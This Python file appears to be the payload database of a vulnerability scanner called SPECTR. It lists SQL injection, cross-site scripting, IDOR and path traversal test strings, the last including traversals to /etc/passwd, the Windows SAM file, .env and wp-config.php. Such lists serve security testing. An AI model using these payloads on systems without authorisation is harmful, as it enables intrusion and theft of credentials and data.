"""
Payload database for SPECTR vulnerability scanner
"""

class PayloadDatabase:
    """Database of payloads for different vulnerability types"""
    
    def __init__(self):
        self.payloads = {
            'sqli': self._get_sqli_payloads(),
            'xss': self._get_xss_payloads(),
            'idor': self._get_idor_payloads(),
            'traversal': self._get_traversal_payloads()
        }
    
    def get_payloads(self, vuln_type):
        """Get payloads for a specific vulnerability type"""
        return self.payloads.get(vuln_type, [])
    
    def _get_sqli_payloads(self):
        """SQL injection payloads"""
        return [
            # Error-based payloads
            "'",
            "\"",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR (1=1)--",
            
            # Union-based payloads
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT null,null,null--",
            
            # Boolean-based payloads
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            
            # Time-based payloads
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "'; SELECT pg_sleep(5)--",
            
            # Numeric payloads
            "1 OR 1=1",
            "1 OR 1=2",
            "1' OR '1'='1",
            "1' OR '1'='2",
            
            # Common bypass attempts
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "'/**/OR/**/1=1--",
            "' OR 1=1%00",
            "' OR 1=1\x00",
        ]
    
    def _get_xss_payloads(self):
        """Cross-site scripting payloads"""
        return [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert('SPECTR')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # Event-based XSS
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "javascript:alert(1)",
            "javascript:confirm('XSS')",
            
            # Advanced XSS
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            
            # Filter bypass attempts
            "<Script>alert('XSS')</Script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            
            # Encoded payloads
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            
            # HTML5 XSS
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]
    
    def _get_idor_payloads(self):
        """Insecure Direct Object Reference payloads"""
        return [
            # Numeric increments/decrements
            "1", "2", "3", "4", "5", "10", "100", "1000",
            "-1", "-2", "-3", "0",
            
            # Common user IDs
            "admin", "administrator", "root", "user", "test",
            "demo", "guest", "public", "anonymous",
            
            # UUID-like patterns
            "00000000-0000-0000-0000-000000000001",
            "11111111-1111-1111-1111-111111111111",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            
            # Path-based IDOR
            "../", "../../", "../../../",
            "..", "..%2F", "..%5c",
            
            # File-based IDOR
            "config.php", "config.json", "settings.ini",
            "users.txt", "passwords.txt", "database.sql",
            
            # Session/token manipulation
            "ABC123", "123ABC", "TOKEN123", "SESSION123",
            
            # Special characters
            "*", "%", "null", "undefined", "NaN",
            
            # Boolean values
            "true", "false", "1", "0", "yes", "no",
        ]
    
    def _get_traversal_payloads(self):
        """Path traversal payloads"""
        return [
            # Basic traversal
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "../../../../../../",
            "../../../../../../../",
            "../../../../../../../../",
            
            # URL encoded
            "%2e%2e%2f",
            "%2e%2e%5c",
            "%2e%2e/",
            "..%2f",
            "..%5c",
            "%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            
            # Double URL encoded
            "%252e%252e%252f",
            "%252e%252e%255c",
            
            # Mixed encoding
            "..%252f",
            "..%c0%af",
            "..%c1%9c",
            
            # Null byte injection
            "../%00",
            "../../%00",
            "../../../%00",
            
            # Windows-specific
            "..\\",
            "..\\..\\",
            "..\\..\\..\\",
            "..\\..\\..\\..\\",
            
            # Common file targets
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../etc/hosts",
            "../etc/group",
            
            # Windows targets
            "..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\windows\\system32\\config\\sam",
            "..\\windows\\win.ini",
            "..\\windows\\system.ini",
            
            # Application-specific
            "../config/database.yml",
            "../config/config.php",
            "../wp-config.php",
            "../.env",
            "../.htaccess",
            "../web.config",
            
            # Filter bypass
            "....//",
            "....\\\\",
            "..../",
            "....\\",
            "....//....//",
            "....\\\\....\\\\",
        ]